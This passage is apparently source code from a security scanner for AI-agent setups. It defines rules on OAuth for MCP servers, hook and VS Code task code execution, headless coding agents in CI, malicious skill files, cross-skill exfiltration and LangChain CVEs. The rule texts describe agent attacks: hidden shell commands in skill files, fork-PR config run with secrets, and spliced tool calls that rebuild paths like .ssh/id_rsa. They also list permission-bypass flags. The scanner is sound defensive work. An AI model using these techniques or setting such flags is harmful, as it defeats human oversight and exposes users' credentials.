    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-10"],
    limitations=(
        "Examines only files that contain a word starting with oauth, "
        "authorization_endpoint, token_endpoint or client_id (in any case; "
        "`GOOGLE_CLIENT_ID` does not count) or the call `authorize(`. In them it "
        "matches a literal `Bearer <token>` string in a file that also contains "
        "`Authorization` and neither `DPoP` nor `cnf`. A token attached the usual way, "
        "from a variable (`f\"Bearer {token}\"`), and the same literal in a file with "
        "none of those words, are not matched."
    ),
)

# AAK-OAUTH-006 — RFC 9207 `iss` validation (MCP 2026-07-28 RC, SEP-2468).
# The ratified 2026-07-28 spec requires OAuth clients to validate the `iss`
# authorization-response parameter per RFC 9207, a low-cost mitigation for the
# mix-up attack class that MCP's single-client / many-server pattern makes more
# likely. A future spec version will require clients to reject responses that
# omit `iss`. Source: modelcontextprotocol.io/specification/2026-07-28/changelog
_r(
    "AAK-OAUTH-006",
    "OAuth client does not validate the `iss` authorization-response parameter (RFC 9207)",
    "An OAuth authorization-code client processes the authorization response / "
    "redirect callback (reads `code` and `state`, or exchanges the code at the "
    "token endpoint) but never references the `iss` parameter. The MCP "
    "ratified 2026-07-28 spec (SEP-2468) requires clients to validate "
    "`iss` on authorization responses per RFC 9207 — without it, an attacker "
    "who controls one authorization server in MCP's single-client / "
    "many-server deployment can mount an OAuth mix-up attack and have the "
    "client redeem a code at the wrong server. This is the token-issuer-validation "
    "arm of the 2026-07-28 final MCP auth profile (scanned together with RFC 8707 "
    "resource indicators, `AAK-OAUTH-007`, and RFC 9728 Protected-Resource-Metadata "
    "discovery, `AAK-OAUTH-008`, via `--profile mcp-2026-07-28`). A later spec "
    "version will require rejecting responses that omit `iss` entirely.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Validate the `iss` authorization-response parameter against the expected "
    "issuer of the authorization server the request was sent to (RFC 9207), "
    "and reject the response on mismatch. Have your authorization server emit "
    "`iss` now so the check can be enforced before the 2026-07-28 cutover.",
    sarif_name="OAuthMissingIssValidation",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-11"],
    limitations=(
        "Examines only files that contain a word starting with oauth, "
        "authorization_endpoint, token_endpoint or client_id (in any case; "
        "`GOOGLE_CLIENT_ID` does not count) or the call `authorize(`. In them it fires "
        "on a code exchange (`grant_type=authorization_code`, "
        "`exchange_code_for_token`, or a read of `code` from the query arguments) when "
        "the word `iss` appears nowhere in the file. Any `iss` counts as validating "
        "the authorization response, including a JWT claim check on the ID token "
        "(`claims[\"iss\"]`), and the same exchange in a file with none of those words "
        "is not reported."
    ),
)

# AAK-OAUTH-007 — RFC 8707 Resource Indicators (`resource` parameter).
# The *ratified* MCP 2025-11-25 authorization spec makes Resource Indicators
# mandatory: MCP clients MUST send the `resource` parameter on both the
# authorization request and the token request, set to the MCP server's
# canonical URI, so the authorization server audience-binds the issued token
# (RFC 8707 §2; aligns with RFC 9728 §7.4). Without it a token minted for one
# MCP server can be replayed at another — the confused-deputy / audience-
# confusion class the spec's "Access Token Privilege Restriction" section
# forbids. This is a requirement of the current ratified spec, not a
# 2026-07-28 change. Source:
#   https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization
_r(
    "AAK-OAUTH-007",
    "OAuth flow does not set the RFC 8707 `resource` parameter (Resource Indicators)",
    "An OAuth 2.1 authorization/token flow — or an MCP client/server config that "
    "advertises OAuth 2.1 — builds authorization and/or token requests without the "
    "RFC 8707 `resource` parameter. The ratified MCP 2025-11-25 authorization spec "
    "requires MCP clients to send `resource` on both the authorization request and "
    "the token request, identifying the MCP server by its canonical URI, so the "
    "authorization server audience-binds the issued token. Without Resource "
    "Indicators the token is not bound to a specific MCP server, so a token minted "
    "for one server can be replayed at another (token replay / audience confusion) "
    "— the confused-deputy class OAuth 2.1 §5.2 and the MCP spec's Access Token "
    "Privilege Restriction section forbid.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Set the `resource` parameter to the MCP server's canonical URI so issued "
    "tokens are audience-bound (RFC 8707, on both the authorization and token "
    "requests); reject tokens whose audience is not this server (validate the "
    "audience per RFC 8707 §2 / RFC 9728 §7.4).",
    sarif_name="OAuthMissingResourceIndicator",
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-11"],
    limitations=(
        "Examines only files that contain a word starting with oauth, "
        "authorization_endpoint, token_endpoint or client_id (in any case; "
        "`GOOGLE_CLIENT_ID` does not count) or the call `authorize(`. In them it fires "
        "on a token request (`grant_type=...`, `response_type=code`, `authorize(`, "
        "`authorization_endpoint`, `token_endpoint` or an `/authorize` or `/token` "
        "path) in a file with no `resource` parameter. Any `resource = ...` "
        "assignment, `\"resource\":` key, `?resource=` or `&resource=` parameter, "
        "`resource_indicator(s)` or the text `RFC 8707` (any case, a comment included) "
        "counts as the RFC 8707 parameter, including an unrelated local variable named "
        "`resource`, and the same request in a file with none of those words is not "
        "reported."
    ),
)

# AAK-OAUTH-008 — RFC 9728 Protected Resource Metadata discovery gap.
# The ratified MCP 2025-11-25 auth spec makes RFC 9728 a MUST: an MCP server
# advertises its authorization server(s) via Protected Resource Metadata at
# `/.well-known/oauth-protected-resource`, and clients discover auth that way
# rather than carrying a static credential. This is the resource-discovery arm
# of the 2026-07-28 final auth profile (`--profile mcp-2026-07-28`, with
# AAK-OAUTH-006 iss-validation + AAK-OAUTH-007 resource indicators). Source:
#   https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization
_r(
    "AAK-OAUTH-008",
    "MCP OAuth surface with no RFC 9728 Protected Resource Metadata discovery",
    "A remote MCP OAuth surface presents no RFC 9728 Protected Resource Metadata "
    "discovery: a client config points at a remote (HTTP/SSE) MCP server and "
    "carries an inline / static credential (an `Authorization` / `Bearer` header, "
    "an `auth` block, or an embedded token) with no reference to "
    "`/.well-known/oauth-protected-resource`, `authorization_servers`, or "
    "`resource_metadata`; or MCP server source enforces bearer auth (e.g. "
    "`WWW-Authenticate`, a FastMCP `BearerAuthProvider`) without serving Protected "
    "Resource Metadata. The ratified MCP 2025-11-25 auth spec requires servers to "
    "implement RFC 9728 so clients can discover the authorization server and obtain "
    "an audience-bound token instead of relying on a pre-shared secret; the "
    "2026-07-28 final auth profile builds on it. Without PRM the deployment cannot "
    "participate in discovery-based auth and typically hardcodes credentials.",
    Severity.LOW,
    Category.MCP_CONFIG,
    "Serve RFC 9728 Protected Resource Metadata at "
    "`/.well-known/oauth-protected-resource` (with an `authorization_servers` "
    "entry) and have clients discover the authorization server from it — via the "
    "`resource_metadata` field of a 401 `WWW-Authenticate` challenge — instead of "
    "embedding a static bearer/token credential in the MCP client config.",
    sarif_name="OAuthMissingProtectedResourceMetadata",
    cve_references=[
        # 2026-09-16. CVE-2026-63127 (rmcp, the official Rust MCP SDK, HIGH
        # 8.2, CWE-345): the OAuth implementation omits the RFC 9728
        # `resource` field from ResourceServerMetadata and accepts
        # protected-resource metadata without confirming the returned
        # identifier matches the configured server, so a malicious server
        # points a victim at a legitimate authorization server and captures
        # the token that comes back. This rule is the shape. The crate is
        # not pinnable: Cargo manifests are outside _CANDIDATE_NAMES, and
        # PyPI `rmcp` is an unrelated project on a 0.x line, so a pin keyed
        # on that name would fire on the wrong software. Fixed in 2.0.0.
        "CVE-2026-63127",
    ],
    owasp_mcp_references=["MCP01:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-11"],
    limitations=(
        "Fires on a config with double-quoted keys that declares a remote server "
        "(`\"type\"` or `\"transport\"` set to http, sse, streamable, streamablehttp "
        "or streamable-http, or a `\"url\"` starting `http://` or `https://`) and "
        "carries an inline credential (an `\"Authorization\":` header, a `Bearer` "
        "value, an `\"auth\": {` block, or an `access_token`, `api_key` or `token` "
        "field), or on source that mentions `WWW-Authenticate`, `BearerAuthProvider`, "
        "`RequireAuthMiddleware` or `require_auth`, when the file never mentions "
        "`oauth-protected-resource`, `protected_resource_metadata` (also with `-` or "
        "no separator), `resource_metadata`, `authorization_servers` or `RFC 9728`. A "
        "static key in another header (`X-API-Key`) is not recognised as an inline "
        "credential, and a config with unquoted keys (YAML `type: http`) is not "
        "recognised as a remote server."
    ),
)

# ---------------------------------------------------------------------------
# Claude Code Hook RCE (AAK-HOOK-RCE-001..003)
#
# References:
#   - NVD: CVE-2025-59536 (Claude Code hooks RCE) —
#     https://nvd.nist.gov/vuln/detail/CVE-2025-59536
#   - OWASP Top 10 A03:2021 (Injection).
#   - CWE-78 (OS Command Injection), CWE-94 (Code Injection).
# ---------------------------------------------------------------------------

_r(
    "AAK-HOOK-RCE-001",
    "Hook command interpolates user-controlled input",
    "A Claude Code hook script command-string interpolates a variable or "
    "captured group directly into a shell command. This is the CVE-2025-59536 "
    "shape: a poisoned config file triggers arbitrary code execution.",
    Severity.CRITICAL,
    Category.HOOK_INJECTION,
    "Never interpolate hook input into a shell string. Use an argv list and a "
    "no-shell exec. Quote with shlex.quote if a shell is absolutely required.",
    sarif_name="HookRceInterpolation",
    cve_references=["CVE-2025-59536"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-RCE-01"],
    limitations=(
        "Reads command strings in the Claude Code settings files, and .sh, .bash, .py, "
        ".js, .ts or .mjs scripts under a `hooks` directory inside `.claude/`, looking "
        "for `${`, `$(`, a backtick, `{{`, `%{` or a string `+` directly before a name "
        "beginning input, args, event, payload, user, argv or request. In a .py, .js, "
        ".ts or .mjs script that counts only when the same file also contains one of "
        "the texts `subprocess.<name>`, `os.system`, `os.popen`, `commands.getoutput`, "
        "`child_process`, `execSync`, `spawnSync`, the word `exec` or `execa`, "
        "`spawn(`, `Deno.run`, `sh -c`, `bash -c` or `os.exec`, called or not, so a "
        "wrapper such as `execute(...)` does not count. The same script kept outside "
        "`.claude/hooks/` (`scripts/guard.sh`) or under another extension "
        "(`guard.zsh`) is not read, and a plain `$cmd` filled from `jq` is not matched."
    ),
)

_r(
    "AAK-HOOK-RCE-002",
    "Hook runs with shell=True and variable interpolation",
    "A hook script invokes subprocess.run / spawn with shell=True (or the "
    "equivalent in Node/Bash) while passing a composed string that includes "
    "caller-provided fields.",
    Severity.CRITICAL,
    Category.HOOK_INJECTION,
    "Use shell=False and pass argv as a list. If a shell is needed, build "
    "commands from quoted constants only.",
    sarif_name="HookShellTrue",
    cve_references=["CVE-2025-59536"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-RCE-02"],
    limitations=(
        "Matches `shell=True` before the first closing parenthesis of a "
        "`subprocess.run`, `call`, `Popen` or `check_output` call, and `{ shell: true "
        "}` as the first option of a Node `spawn`, `spawnSync`, `child_process.exec` "
        "or `child_process.execSync` call, in a .sh, .bash, .py, .js, .ts or .mjs "
        "script under `.claude/.../hooks/`. A call with another call ahead of it "
        "(`subprocess.run(build(cmd), shell=True)`), `subprocess.check_call`, "
        "`os.system` and `os.popen`, which always use a shell, and a Node `{ cwd: dir, "
        "shell: true }` that does not start with `shell`, are not matched."
    ),
)

_r(
    "AAK-HOOK-RCE-003",
    "Hook trust check is bypassable by project-local config",
    "A settings.local.json or project-relative hook file executes before "
    "the Claude Code trust prompt. This is the core CVE-2025-59536 regression "
    "pattern; any project-contained hook must not run until trust is "
    "confirmed.",
    Severity.HIGH,
    Category.HOOK_INJECTION,
    "Require explicit trust confirmation before loading project-local hook "
    "configuration. Upgrade to Claude Code 1.0.111 or later.",
    sarif_name="HookTrustBypass",
    cve_references=["CVE-2025-59536"],
    owasp_agentic_references=["ASI05", "ASI09"],
    adversa_references=["ADV-RCE-03"],
    limitations=(
        "Reports a `command`, `cmd`, `run` or `script` value only in "
        "`settings.local.json` at the root or in `.claude/`. The same hook committed "
        "in `.claude/settings.json`, which a repository ships to everyone who opens "
        "it, and hook script files are not reported."
    ),
)

# ---------------------------------------------------------------------------
# VS Code IDE task / launch folder-open RCE (AAK-IDE-TASK-001..004)
#
# `.vscode/tasks.json` and `.vscode/launch.json` are agent-adjacent config the
# scanner did not read before: `.vscode/mcp.json` was covered, the task surface
# was not. The keyv npm worm (2025) spread by shipping a task with
# `runOptions.runOn: folderOpen`, which executes the moment a victim opens the
# repo — before any interaction and before the workspace-trust prompt.
# ---------------------------------------------------------------------------

_r(
    "AAK-IDE-TASK-001",
    "VS Code task auto-executes on folderOpen (pre-trust code execution)",
    "A task in `.vscode/tasks.json` sets `runOptions.runOn: folderOpen`, so it "
    "runs as soon as the folder is opened — before any human interaction and "
    "before the workspace-trust prompt. This is the vector the keyv npm worm used "
    "to spread: a poisoned repository executes code the instant a victim opens "
    "it. Severity is high on its own and critical when the auto-run command is a "
    "shell, an interpreter, or a network fetch.",
    Severity.HIGH,
    Category.HOOK_INJECTION,
    "Remove `runOn: folderOpen` from any task that runs a command, or gate the "
    "task behind an explicit manual trigger. Never auto-run a shell, interpreter, "
    "or network-fetch command on folder open; require workspace trust first.",
    sarif_name="IdeTaskFolderOpenAutorun",
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-RCE-04"],
    limitations=(
        "Reads the `tasks` array of `.vscode/tasks.json` for `runOptions.runOn: "
        "folderOpen`. A task declared in the `tasks` block of a workspace file "
        "(`*.code-workspace`) is not read."
    ),
)

_r(
    "AAK-IDE-TASK-002",
    "VS Code task command reaches a shell via pipe, repo-path interpreter, or interpolation",
    "A task in `.vscode/tasks.json` builds its `command`/`args` in a way that "
    "reaches a shell: a pipe-to-shell (`... | sh`), an interpreter invoked on a "
    "script path inside the repo, or a `${...}`/interpolated variable spliced into "
    "a shell string. A poisoned repository controls that string, so opening or "
    "running the task executes attacker-chosen code.",
    Severity.HIGH,
    Category.HOOK_INJECTION,
    "Do not pipe downloaded content into a shell and do not interpolate variables "
    "into shell command strings. Invoke a vetted, in-tree binary with a fixed "
    "argv, and pin or verify any script the task runs.",
    sarif_name="IdeTaskShellInjection",
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-RCE-05"],
    limitations=(
        "Judges a task by its own `command` and `args` text: a pipe into sh, bash, "
        "zsh, dash, ksh, fish, pwsh or powershell; python, python2, python3, node, "
        "deno, bun, ruby, perl, php, bash, sh or zsh followed directly by a path of "
        "letters, digits, `_`, `-`, `.`, `/` and `\\` that ends .py, .js, .cjs, .mjs, "
        ".ts, .rb, .pl, .php, .sh, .bash, .zsh or .ps1; or `${`, `%{`, `{{`, `$(`, a "
        "backtick or a string `+` directly before a name beginning input, args, event, "
        "payload, user, argv or request. A script run directly (`./scripts/setup.sh`), "
        "through a runner (`npm run setup`) or after a flag (`bash -x "
        "./scripts/setup.sh`), and a path that starts with `${workspaceFolder}`, are "
        "not followed."
    ),
)

_r(
    "AAK-IDE-TASK-003",
    "VS Code launch.json preLaunchTask chains to a flagged auto-exec task",
    "A configuration in `.vscode/launch.json` sets `preLaunchTask` to a task that "
    "AAK flagged (a folderOpen auto-run or a shell-reaching command). Starting a "
    "debug session then runs that task, so the launch config is a second trigger "
    "for the same code-execution path. Reported as one finding naming both files.",
    Severity.HIGH,
    Category.HOOK_INJECTION,
    "Point `preLaunchTask` only at tasks that run vetted, fixed-argv commands. "
    "Remove the auto-run or shell injection from the referenced task (see the "
    "paired AAK-IDE-TASK-001 / AAK-IDE-TASK-002 finding).",
    sarif_name="IdeLaunchPreLaunchTaskChain",
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-RCE-06"],
    limitations=(
        "Matches a launch configuration's `preLaunchTask` by label against tasks that "
        "AAK-IDE-TASK-001 or AAK-IDE-TASK-002 flagged in the `tasks.json` next to it. "
        "A `preLaunchTask` that names a compound task (`dependsOn: [\"setup\"]`) "
        "reaches the same script but is not matched, and `postDebugTask` is not read."
    ),
)

_r(
    "AAK-IDE-TASK-004",
    "VS Code task/launch config could not be parsed",
    "A `.vscode/tasks.json` or `.vscode/launch.json` file could not be parsed even "
    "after stripping JSONC comments and trailing commas. AAK reports this rather "
    "than skipping it silently: an unparseable config file is exactly where an "
    "auto-run task would hide from a scan.",
    Severity.LOW,
    Category.AGENT_CONFIG,
    "Fix the JSON/JSONC syntax so the file can be audited. If it is intentionally "
    "not a VS Code task/launch config, move it out of `.vscode/`.",
    sarif_name="IdeTaskConfigUnparsable",
    limitations=(
        "Parses only `tasks.json` and `launch.json` directly inside a `.vscode` "
        "folder. A broken `.vscode/settings.json`, or a `.code-workspace` file, "
        "which can carry a `tasks` block of its own, is not parsed and never "
        "reported."
    ),
)


# The four AAK-AGENT-TRUST-* rules scan ONE artifact at a time — a pre-screen,
# not a boundary control. State that plainly on each so the rule set is honest
# about its own blind spot; the set-level AAK-AGENT-COMPOSE-001 covers it.
_AGENT_TRUST_LIMITATION = (
    "Single-artifact pre-screen, not a boundary control. These rules inspect one "
    "file at a time, so they cannot see intent split across several "
    "individually-benign skills loaded into the same agent context. Cross-skill "
    "composition defeats per-skill scanners: ColluSkill (arXiv:2608.09732) reports a "
    "96.0% average attack success rate across six skill scanners, and SkillsMetric "
    "(arXiv:2608.08468) reports 0% detection for host-destruction via common shell "
    "commands and 42% for natural-language prompt injection. Run these early and "
    "cheaply as a first pass; they are not a guarantee. The composition blind spot "
    "they cannot see is covered by the set-level rule AAK-AGENT-COMPOSE-001."
)


_r(
    "AAK-AGENT-TRUST-001",
    "Coding agent run non-interactively (-p / headless) in CI trusts repo-resident config",
    "A CI workflow runs a coding-agent CLI in non-interactive mode "
    "(`claude -p` / `--dangerously-skip-permissions`, `gemini --yolo`, "
    "`aider --yes`, `codex --full-auto`, `cursor-agent`, `opencode run`, or a "
    "first-party agent Action). Non-interactive mode removes the workspace-trust "
    "prompt, so every repo-resident skill, command, MCP config, and task file is "
    "trusted on load and its instructions are honoured automatically. A study of "
    "malicious skill files (arXiv:2608.05223) measured coding agents executing the "
    "shell commands hidden in benign-appearing skill files in the large majority of "
    "runs (Gemini CLI 95.5-96.1%, Qwen Code 71.6-74.0%), with explicit safety "
    "recognition in only 1.99% of 5,629 runs. The trust prompt this path skips is "
    "the guardrail the per-file scanners (`AAK-IDE-TASK-*`, `AAK-SKILL-*`, "
    "`AAK-AGENT-*`) assume is present.",
    Severity.HIGH,
    Category.HOOK_INJECTION,
    "Do not run a coding agent headless over the whole repo tree on every event. "
    "Restrict the agent to trusted refs, pin or allow-list the skill / MCP / task "
    "files it may load, and review new agent-config files in PRs before a workflow "
    "will execute them.",
    sarif_name="HeadlessAgentInCiTrustsRepoConfig",
    limitations=_AGENT_TRUST_LIMITATION,
    owasp_agentic_references=["ASI05", "ASI09"],
    adversa_references=["ADV-INJECT-04"],
)


_r(
    "AAK-AGENT-TRUST-002",
    "Headless agent CI runs on an attacker-controllable ref (fork-PR config executes with secrets)",
    "A workflow that runs a coding agent non-interactively is triggered by an "
    "attacker-controllable event (`pull_request_target`, `issue_comment`, "
    "`workflow_run`, `pull_request_review[_comment]`) or explicitly checks out the "
    "pull-request head ref, and then runs the agent with the base repository's "
    "write-scoped `GITHUB_TOKEN` and secrets available. Because the headless run "
    "trusts repo-resident skill / MCP / task files on load, a fork PR that adds or "
    "edits one of those files gets its shell commands executed in CI with the base "
    "repo's credentials, with no human trust prompt. This is the trust-on-first-use "
    "bypass amplified by the classic pwn-request trigger.",
    Severity.CRITICAL,
    Category.HOOK_INJECTION,
    "Never run a headless agent on `pull_request_target` / `workflow_run` / "
    "`issue_comment` with secrets in scope, and never check out the PR head into a "
    "job that then runs the agent. Split the privileged step onto the trusted base "
    "ref, gate on a maintainer approval, and drop `GITHUB_TOKEN` to read-only.",
    sarif_name="HeadlessAgentCiUntrustedRef",
    limitations=_AGENT_TRUST_LIMITATION,
    owasp_agentic_references=["ASI03", "ASI05"],
    adversa_references=["ADV-INJECT-04"],
)


_r(
    "AAK-AGENT-TRUST-003",
    "Repo-resident agent settings bake in trust / auto-approval",
    "A checked-in agent settings file (`.claude/settings.json`, "
    "`.gemini/settings.json`, `.cursor/settings.json`, and siblings) sets a flag "
    "that persists trust or auto-approval: `bypassPermissions`, "
    "`permissionMode: bypassPermissions`, `autoApprove`, an approval mode of "
    "`yolo` / `full-auto`, or `trust: true`. Trust-on-first-use is then baked into "
    "the repository rather than granted per session, so it survives every "
    "subsequent invocation (including a headless CI run) and travels with the "
    "repository when it is forked or checked out on an untrusted ref.",
    Severity.HIGH,
    Category.AGENT_CONFIG,
    "Remove the persisted-trust / auto-approve flag from the checked-in settings. "
    "Grant approval per session interactively, or scope it to an explicit, minimal "
    "allow-list of tools rather than a blanket bypass.",
    sarif_name="AgentSettingsPersistTrust",
    limitations=_AGENT_TRUST_LIMITATION,
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI02", "ASI09"],
    adversa_references=["ADV-PRIV-01"],
)


_r(
    "AAK-AGENT-TRUST-004",
    "Gemini context/instruction file carries an embedded shell payload",
    "A Gemini context / instruction file (`GEMINI.md` or a file under `.gemini/`) "
    "contains an embedded shell payload: a fenced shell block or a pipe-to-shell "
    "one-liner. Gemini auto-loads these files as context on session start, and the "
    "malicious-skill-file study (arXiv:2608.05223) measured this surface exploited "
    "in 95.5-96.1% of runs. The `AAK-AGENT-*` instruction-file family covered "
    "`CLAUDE.md` / `AGENTS.md` / `.cursorrules` / `.windsurfrules` / "
    "`copilot-instructions.md` but not the Gemini surface; this closes that gap.",
    Severity.MEDIUM,
    Category.AGENT_CONFIG,
    "Do not ship executable shell in an agent context file. Keep `GEMINI.md` to "
    "prose guidance, move any real scripts into a reviewed, path-pinned location, "
    "and treat instruction files from an untrusted ref as untrusted input.",
    sarif_name="GeminiInstructionShellPayload",
    limitations=_AGENT_TRUST_LIMITATION,
    owasp_agentic_references=["ASI01", "ASI05"],
    adversa_references=["ADV-INJECT-04"],
)


_r(
    "AAK-AGENT-COMPOSE-001",
    "Skill set's composed capability union crosses a risk boundary no single skill requested",
    "Unlike the `AAK-AGENT-TRUST-*` / `AAK-SKILL-*` rules, which inspect one "
    "artifact at a time, this rule evaluates the SET of skills that load into one "
    "agent context (all `SKILL.md` under a common container such as "
    "`.claude/skills/`). It computes the union of declared capability across the set "
    "(filesystem read/write, network egress by destination, shell execution, "
    "credential access, memory write) and flags a union that crosses a configured "
    "risk boundary that no single skill in the set requested. The shipped default: a "
    "skill that can read the filesystem or credentials, composed with a skill that "
    "can egress to a non-allowlisted destination, is an exfiltration path even when "
    "every contributing skill is individually clean. That is the cross-skill "
    "composition attack ColluSkill (arXiv:2608.09732) measured at a 96.0% average "
    "success rate across six per-skill scanners. The finding names which skill "
    "contributed which capability and lists every contributor as a related location. "
    "The boundary set and egress allowlist are configurable via "
    "`.aak/composition-boundaries.yaml`; the default and its reasoning are in "
    "`docs/rules/skill-composition.md`.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Do not load a skill that reads files or credentials into the same context as a "
    "skill that can egress to an unaudited destination. Split them into separate "
    "agent contexts, pin each egress skill to an allowlisted destination, or remove "
    "the network capability from the read-capable set. Review a new skill for the "
    "capability it adds to the union, not only in isolation.",
    sarif_name="SkillSetCapabilityUnionExfil",
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-INJECT-04"],
    limitations=(
        "Heuristic on DECLARED capability (`allowed-tools` / `capabilities` / "
        "`egress` frontmatter). A skill that under-declares its tools, or reaches a "
        "capability through an MCP server it does not name, is not measured here; the "
        "per-skill scanners and Python taint analysis cover in-body behaviour. It "
        "reasons about capability, not data flow, so it flags a possible exfiltration "
        "path, not a proven one."
    ),
)


_r(
    "AAK-AGENT-COMPOSE-002",
    "Tool-call arguments spliced across a session reconstruct a denied file path or URL",
    "Where AAK-AGENT-COMPOSE-001 unions capability across a set of skills, this rule "
    "reads an ordered transcript of tool calls in one session and flags when the "
    "concatenation of arguments across consecutive same-tool calls reconstructs a "
    "sensitive file path (e.g. `.ssh/id_rsa`, `.env`, `.aws/credentials`) or a URL to a "
    "non-allowlisted host that no single call would have been allowed to request. Each "
    "call is individually compliant; the intent exists only after fragmentation. This is "
    "the GhostSplice / cross-channel trust-fragmentation attack disclosed by the ASSET "
    "Research Group (https://asset-group.github.io/disclosures/ghostsplice/): a malicious "
    "MCP server splits one refused request across several channels the agent already "
    "trusts. Scope is deliberately narrow: file-path and URL reassembly only, not general "
    "intent detection. It was written from the public disclosure, not from a reproduction "
    "AAK ran. Reuses AAK-AGENT-COMPOSE-001's config "
    "(`.aak/composition-boundaries.yaml`: `session_reassembly.sensitive_path_patterns` and "
    "the shared `egress_allowlist`).",
    Severity.MEDIUM,
    Category.TRUST_BOUNDARY,
    "Deny on the reassembled value, not just per-call arguments: normalise and re-check "
    "the full path or URL at the point of file read or network egress, and pin egress to "
    "an allowlist. Review the flagged session for whether the fragmentation was legitimate "
    "chunked work or an actual splice.",
    sarif_name="SessionSpliceReassembledDeniedTarget",
    owasp_mcp_references=["MCP06:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-INJECT-04"],
    incident_references=["GHOSTSPLICE-2026-08"],
    limitations=(
        "Defaults to a warning (MEDIUM), not a failure, because it WILL produce false "
        "positives on legitimate chunked work: a large file uploaded or written in "
        "path-sized pieces, or a URL built from templated fragments, reassembles the same "
        "way an attack does. It only sees file-path and URL reassembly across consecutive "
        "same-tool calls; a splice across different tools, or intent that is not a path or "
        "URL, is out of scope. Treat a finding as a prompt to look, not a verdict."
    ),
)

# ---------------------------------------------------------------------------
# LangChain Path Traversal (AAK-LANGCHAIN-001..003)
#
# References:
#   - NVD: CVE-2026-34070 (LangChain load_prompt absolute path /
#     .. traversal) — https://nvd.nist.gov/vuln/detail/CVE-2026-34070
#   - NVD: CVE-2025-68664 — https://nvd.nist.gov/vuln/detail/CVE-2025-68664
#   - GHSA-r399-636x-v7f6 (LangChain serialization injection).
#   - CWE-22 (Path Traversal), CWE-502 (Deserialization of Untrusted Data).
# ---------------------------------------------------------------------------

_r(
    "AAK-LANGCHAIN-001",
    "Project depends on langchain-core < 1.2.22 (load_prompt path traversal)",
    "A Python manifest pins `langchain-core`, the PyPI distribution "
    "CVE-2026-34070 names (GHSA-qh6h-p6c9-ff54), below 1.2.22. Before that "
    "release, load_prompt() and load_prompt_from_config() accept absolute paths "
    "and '..' traversal.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade to langchain-core >= 1.2.22. If you must keep the legacy "
    "behavior, pass allow_dangerous_paths=True explicitly.",
    sarif_name="LangchainPathTraversalVuln",
    cve_references=["CVE-2026-34070"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SUPPLY-01"],
    auto_fixable=True,
    limitations=(
        "Reads `langchain-core`, in any PEP 503 spelling, from requirements.txt, "
        "requirements-dev.txt, requirements-prod.txt, dev-requirements.txt and "
        "pyproject.toml, taking the lowest version a range allows. npm packages are "
        "not read: the advisory names only the PyPI distribution, and npm's "
        "`@langchain/*` packages have version lines of their own. The umbrella "
        "`langchain` and `langchain-community` distributions are not read either, "
        "because their version numbers are not langchain-core's, so a project that "
        "pins only those is not reported."
    ),
)

_r(
    "AAK-LANGCHAIN-002",
    "Call to load_prompt without allow_dangerous_paths review",
    "Source code calls langchain.load_prompt() or load_prompt_from_config() "
    "with a user-controlled path argument. Even on patched versions, the "
    "allow_dangerous_paths escape hatch is a sharp edge.",
    Severity.MEDIUM,
    Category.TAINT_ANALYSIS,
    "Treat load_prompt() as a file read against a trusted root. Resolve, "
    "normalize, and verify the path is inside the intended directory.",
    sarif_name="LangchainLoadPromptUserPath",
    cve_references=["CVE-2026-34070"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SUPPLY-02"],
    limitations=(
        "Pattern-matches the first `load_prompt(` or `load_prompt_from_config(` "
        "call in a file that mentions langchain, and only when the argument is a "
        "bare (dotted) name or an f-string with a `{}` placeholder. An argument "
        "that is a call (`os.path.join(PROMPTS, name)`), a concatenation "
        "(`\"prompts/\" + name`) or a keyword (`path=name`) is not matched."
    ),
)

_r(
    "AAK-LANGCHAIN-003",
    "LangChain deserialization of untrusted data",
    "A Python manifest pins `langchain-core` below 0.3.14. CVE-2025-68664 "
    "(GHSA-c67j-w6g6-q2cm) is a serialization-injection chain in langchain-core's "
    "dumps/loads that extracts secrets through crafted saved chains.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade langchain-core to 0.3.81 or later on the 0.3 line, or to 1.2.5 or "
    "later on 1.x, and pin it. Avoid loading serialized chains from sources you "
    "do not fully control.",
    sarif_name="LangchainDeserializeUntrusted",
    cve_references=["CVE-2025-68664"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-SUPPLY-03"],
    auto_fixable=True,
    limitations=(
        "Reads `langchain-core` from the same Python manifests as AAK-LANGCHAIN-001, "
        "never npm. The floor is the rule's original 0.3.14, below the advisory's "
        "fixes, which are 0.3.81 on 0.3 and 1.2.5 on 1.x, so langchain-core 0.3.14 "
        "to 0.3.80 and 1.0.0 to 1.2.4 are affected and not reported. Every version "
        "below 0.3.14 is also below AAK-LANGCHAIN-001's 1.2.22, which does report it. "
        "LangChain.js has a separate advisory, which no rule cites."
    ),
)

# ---------------------------------------------------------------------------
# .claude-plugin/marketplace.json Security (AAK-MARKETPLACE-001..005)
#
# References:
#   - Anthropic Claude Code plugins/marketplaces (GA Apr 2026).
#   - OWASP ASI04 (Agentic Supply Chain Vulnerabilities). Plugins are not an
#     MCP surface, so these rules carry no MCP Top 10 reference.
#   - CWE-494 (Download of Code Without Integrity Check), CWE-918 (SSRF
#     in postinstall), CWE-1357 (Reliance on Insufficiently Trustworthy
#     Component).
# ---------------------------------------------------------------------------

_r(
    "AAK-MARKETPLACE-001",
    "Unsigned marketplace.json manifest",
